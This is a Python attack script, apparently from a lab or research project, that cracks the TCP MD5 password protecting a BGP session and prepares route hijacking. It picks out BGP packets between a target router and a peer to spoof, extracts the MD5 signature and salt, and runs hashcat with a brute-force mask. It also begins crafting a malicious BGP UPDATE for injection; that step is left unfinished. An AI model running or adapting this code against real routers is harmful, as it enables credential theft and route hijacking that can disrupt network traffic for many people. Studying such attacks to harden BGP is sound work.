import sys
from scapy.all import *
from scapy.layers.inet import IP,TCP
from scapy.contrib.bgp import *
from BGP_crafter import craft_BGP_update_packet
import TCP_MD5_parser


BGP_PORT = 179 #Set to another port e.g. 443 (https) if you want to test it with other types of packets

def break_password(pkt, mask):
    hash_found = False
    if TCP not in pkt:
        pkt.show()
        raise Exception("Cannot find a TCP MD signature in a non TCP packet")
    else:
        if "options" in pkt[TCP].fields:
            for op in pkt[TCP].options:
                if op[0] == 19:
                    tcp_hash = op[1]
                    hash_found = True
                    break
        if hash_found == False:
            pkt.show()
            raise Exception("TCP packet has no MD signature")
        else:
            raw_ip_data = raw(pkt[IP])
            raw_tcp_data = raw(pkt[TCP])
            #get the salt from these bytes
            salt = TCP_MD5_parser.get_md5_salt_from_bytes(raw_ip_data, raw_tcp_data)
            #call hashcat
            result = TCP_MD5_parser.launch_hashcat(tcp_hash, salt, mask)
            if result == "":
                raise Exception("Could not break password of hash {}".format(tcp_hash))
            else:
                password = result.split(":")[2]
                return password

def filter_bgp_packet_to_break(pkt, ip_target, ip_to_spoof):
    if TCP in pkt:
        if pkt[TCP].dport == BGP_PORT and pkt[IP].src == ip_target and pkt[IP].dst == ip_to_spoof:
            #this is a BGP packet coming the target AS
            return True
        if pkt[TCP].dport == BGP_PORT and pkt[IP].dst == ip_target and pkt[IP].src == ip_to_spoof:
            #this is a packet coming to the target AS on its BGP port
            return True
    return False


def packet_callback(captured_packet):
    if captured_packet[TCP].sport == BGP_PORT or captured_packet[TCP].dport == BGP_PORT:
        print(f"Sequence number: {captured_packet[TCP].seq}")
        malicious_bgp_packet = craft_BGP_update_packet("192.168.0.1/24", path=[], local_pref=0)
        malicious_bgp_packet.show()
        # Then, set sequence number of the malicious packet to seq number of the captured packet:
        #   malicious_bgp_packet[TCP] = captured_packet[TCP].seq (something like that)





def main(argv):
    # if len(argv) != 2:
    #     print(f"Usage: {argv[0]} <interface_name>")
    #     print(f"\n\t i.e.: {argv[0]} \"Realtek PCIe GBE Family Controller\"")
    #     sys.exit(-1)
    # sniff(iface=argv[1], prn=packet_callback, filter="tcp", store=0)

    ## PARAMETERS
    mask = "-1 ?u?l -2 ?u?l?d ?1?1?1?1?1?1?1?1 --increment --increment-min 4"
    IP_TARGET = "192.168.12.1"
    IP_TO_SPOOF = "192.168.12.2"

    ## MAIN
    print("[*] Sniffing a packet to break TCP MD5 password")
    packet_to_break = sniff(lfilter=lambda p: filter_bgp_packet_to_break(p, IP_TARGET, IP_TO_SPOOF), count=1, offline="captures/attack_test.pcap")[0]
    print("[*] Packet found !")
    print("[*] Breaking password")
    BGP_password = break_password(packet_to_break, mask)
    print("[*] Password broken: " + BGP_password)

    sniff(prn=lambda p : break_password(p, mask), offline="captures/attack_test.pcap", filter="tcp", count=1)



if __name__ == "__main__":
  main(sys.argv)